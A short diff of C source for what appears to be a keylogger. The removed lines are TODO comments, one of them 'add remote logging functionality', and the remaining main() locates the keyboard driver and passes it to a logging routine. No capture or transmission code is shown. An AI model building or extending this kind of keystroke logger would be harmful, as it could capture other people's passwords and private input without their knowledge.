@@ -36,11 +36,6 @@ void special_char_check(const int code);
 
 int main(int argc, char **argv) {
 
-  // separate into functions
-  // clean up log() by having an enum take care of uncaught codes
-  // clean up log() by separating log entries by times
-  // add remote logging functionality
-
   // find the keyboard driver
   char *driver = set_input();
 
@@ -48,9 +43,6 @@ int main(int argc, char **argv) {
   if(driver)
     log_r(driver);
 
- 
-    // separate delimit() function call from here based
-  // on time elapsed between log entries */
 }
 
 char* set_input() {
